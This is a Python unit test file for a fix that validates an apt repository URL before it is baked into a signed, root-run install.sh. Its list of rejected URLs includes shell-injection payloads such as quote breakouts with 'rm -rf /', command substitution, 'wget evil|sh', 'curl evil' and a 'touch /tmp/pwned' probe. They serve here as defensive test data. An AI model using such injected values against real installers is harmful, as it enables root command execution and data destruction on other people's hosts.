#!/usr/bin/env python3
"""Unit tests for #5685 (M40) — the apt base URL must be VALIDATED before it is
baked into the signed, root-executed install.sh.

publish.py stamp-installer takes a lower-trust config input (--apt-base-url /
XPF_APT_BASE_URL) and substitutes it LITERALLY into a single-quoted shell
string in install.sh:

    XPF_APT_BASE_URL_BAKED='<apt_url>'

That install.sh is then SIGNED with minisign and piped to `sudo sh` on a fresh
host (the Tier-A `curl … | sudo sh` one-liner). A single quote in the URL
breaks out of the literal and the tail becomes signed, root-executed shell —
command injection / supply-chain root. publish.validate_apt_url now rejects any
value that is not a strict https URL with no shell metacharacter / whitespace /
control byte / userinfo / query / fragment, and stamp_installer calls it BEFORE
any substitution.

These tests drive validate_apt_url directly AND stamp_installer end-to-end
(with a throwaway non-placeholder archive key) to prove a malicious URL is
refused before the installer is written. On revert (drop the validation call)
the malicious-URL cases go RED — stamp_installer would happily bake the
injected payload into the installer.
"""

from __future__ import annotations

import os
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "lib"))
from load_subject import load_subject  # noqa: E402

_DIST = Path(__file__).resolve().parent
publish = load_subject("publish", _DIST / "publish.py")

# A syntactically valid, non-placeholder ASCII-armored key block so
# stamp_installer's _read_real_archive_key() accepts it (its bytes are not a
# real key — stamp_installer never verifies the key math, only its shape and
# non-placeholder-ness).
_FAKE_ARCHIVE_KEY = """\
-----BEGIN PGP PUBLIC KEY BLOCK-----

mDMEZmFakeArchiveKeyForUrlValidateTestNotARealKeyAAAAAAAAAAAAAAAAA
=UrlV
-----END PGP PUBLIC KEY BLOCK-----
"""

# Legitimate apt base URLs that MUST be accepted.
_GOOD_URLS = [
    "https://dl.example.com/apt",
    "https://apt.example.org",
    "https://apt.example.org/",
    "https://downloads.example.net/xpf/apt",
    "https://mirror.example.com:8443/apt/xpf",
    "https://a.b-c.example.com/xpf.apt/pool_1",
    "https://host.example.com/~xpf/apt",
]

# Malicious / malformed apt base URLs that MUST be rejected before stamping.
_BAD_URLS = [
    # single-quote breakout -> signed root shell injection (the core #5685 sink)
    "https://x.invalid/apt'; rm -rf / #",
    "https://x.invalid/apt'$(reboot)'",
    # command substitution / backticks
    "https://x.invalid/$(id)",
    "https://x.invalid/`id`",
    # shell metacharacters
    "https://x.invalid/apt; wget evil|sh",
    "https://x.invalid/apt && curl evil",
    "https://x.invalid/apt\nrm -rf /",
    "https://x.invalid/apt with space",
    'https://x.invalid/apt"quote',
    "https://x.invalid/apt$VAR",
    # non-https / non-URL schemes
    "http://x.invalid/apt",
    "file:///etc/passwd",
    "ftp://x.invalid/apt",
    "javascript:alert(1)",
    "x.invalid/apt",
    "",
    # userinfo / query / fragment (not part of a bare apt base URL)
    "https://user:pass@x.invalid/apt",
    "https://x.invalid/apt?a=b",
    "https://x.invalid/apt#frag",
    # percent-escape (would also collide with the %% marker guard)
    "https://x.invalid/apt%27",
    "https://x.invalid/%%XPF_APT_BASE_URL%%",
]


class ValidateAptUrlDirect(unittest.TestCase):
    def test_good_urls_accepted(self):
        for u in _GOOD_URLS:
            with self.subTest(url=u):
                self.assertEqual(publish.validate_apt_url(u), u)

    def test_bad_urls_rejected(self):
        for u in _BAD_URLS:
            with self.subTest(url=u):
                # die() -> sys.exit(msg) -> SystemExit
                with self.assertRaises(SystemExit):
                    publish.validate_apt_url(u)


class StampInstallerUrlGate(unittest.TestCase):
    """End-to-end: stamp_installer must refuse a malicious apt URL BEFORE it
    writes (and before anyone signs) the installer. This is the fail-on-revert
    anchor — drop the validate_apt_url call and the injection is baked in."""

    def setUp(self):
        self.dir = tempfile.mkdtemp(prefix="xpf-urltest-")
        self.addCleanup(_rmtree, self.dir)
        self.key = os.path.join(self.dir, "archive.asc")
        Path(self.key).write_text(_FAKE_ARCHIVE_KEY)

    def _stamp(self, apt_url):
        out = os.path.join(self.dir, "install.baked.sh")
        publish.stamp_installer(out, archive_key=self.key, apt_url=apt_url,
                                channel="stable")
        return out

    def test_malicious_url_not_stamped(self):
        payload = "https://x.invalid/apt'; touch /tmp/pwned #"
        out = os.path.join(self.dir, "install.baked.sh")
        with self.assertRaises(SystemExit):
            self._stamp(payload)
        # The installer must NOT have been written with the injected payload.
        if os.path.exists(out):
            self.assertNotIn("touch /tmp/pwned", Path(out).read_text(),
                             "malicious apt URL was baked into install.sh — "
                             "the #5685 validation gate is missing")

    def test_legit_url_stamped(self):
        out = self._stamp("https://dl.example.com/apt")
        baked = Path(out).read_text()
        self.assertIn("https://dl.example.com/apt", baked)
        self.assertNotIn("%%XPF_APT_BASE_URL%%", baked)


def _rmtree(path):
    import shutil
    shutil.rmtree(path, ignore_errors=True)


if __name__ == "__main__":
    unittest.main()
